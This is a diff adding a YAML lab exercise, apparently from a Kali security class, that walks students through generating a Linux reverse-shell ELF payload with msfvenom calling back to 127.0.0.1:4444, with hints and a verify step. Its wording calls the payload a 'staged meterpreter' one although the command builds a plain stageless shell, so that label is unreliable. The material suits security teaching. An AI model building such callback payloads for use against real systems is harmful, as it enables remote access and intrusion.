@@ -1,0 +1,19 @@
+id: "04"
+title: "Build a payload with msfvenom"
+prompt: |
+  Payloads are generated, not chosen by accident.
+
+  1. Generate a staged meterpreter payload for linux/x64 (harmless file —
+     you don't need to execute it):
+     msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444
+     -f elf -o ~/kali-class-work/sec-wk12/payload.elf
+  2. Note the size in the output — save the generation log (console copy)
+     to ~/kali-class-work/sec-wk12/msfvenom-log.txt
+  3. Stamp: kali-class stamp sec-wk12 msfvenom
+hints:
+  - "msfvenom -p <payload> LHOST=<who-calls-back> LPORT=<port> -f <format> -o <file>"
+  - "This payload connects BACK to you — that's why LHOST matters."
+verify:
+  script: "04-msfvenom.verify.sh"
+  timeout: 60
+on_success: "Payload generated: architecture, format, callback address — all deliberate."
